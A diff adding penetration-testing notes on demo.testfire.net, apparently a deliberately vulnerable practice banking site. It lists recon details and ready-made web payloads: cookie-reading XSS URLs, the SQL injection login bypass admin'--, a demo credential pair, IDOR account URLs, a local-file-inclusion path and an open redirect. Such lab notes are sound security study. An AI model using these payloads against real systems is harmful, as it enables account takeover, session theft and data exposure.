@@ -1,0 +1,34 @@
+1. JSP
+2. IP: 65.61.137.117
+3. Users:
+	- John Smith
+	- Karl Fitzgerald (Chairman and Chief Executive Officer)
+	- https://demo.testfire.net/index.jsp?content=inside_executives.htm
+4. Windows Server (?)
+5. rest api: https://demo.testfire.net/swagger/index.html
+6. maybe feedbacks are written in comments.txt file
+7. Sensitive information on source code:
+	- <!--- Dave- Hard code this into the final script - Possible security problem.
+		Re-generated every Tuesday and old files are saved to .bak format at \backup\website\oldfiles    --->
+	- /feedback.jsp
+		
+----------------
+1. Vulns:
+	1. XSS:
+		- on search bar - https://demo.testfire.net/search.jsp?query=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+		- https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&lang=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+	2. User credentials on /swagger:
+		- jsmith:demo1234
+	3. IDOR:
+		- https://demo.testfire.net/bank/showAccount?listAccounts=800004
+		- https://demo.testfire.net/api/account/800004
+	4. SQLi:
+		- Auth Bypass:
+			- login form :
+				- admin'--
+	5. Incorrect Money Transfer:
+		- /api/transfer
+	6. LFI:
+		- https://demo.testfire.net/index.jsp?content=..//WEB-INF/init.log
+	7. Open Redirect:
+		- https://demo.testfire.net/disclaimer.htm?url=http://www.netscape.com
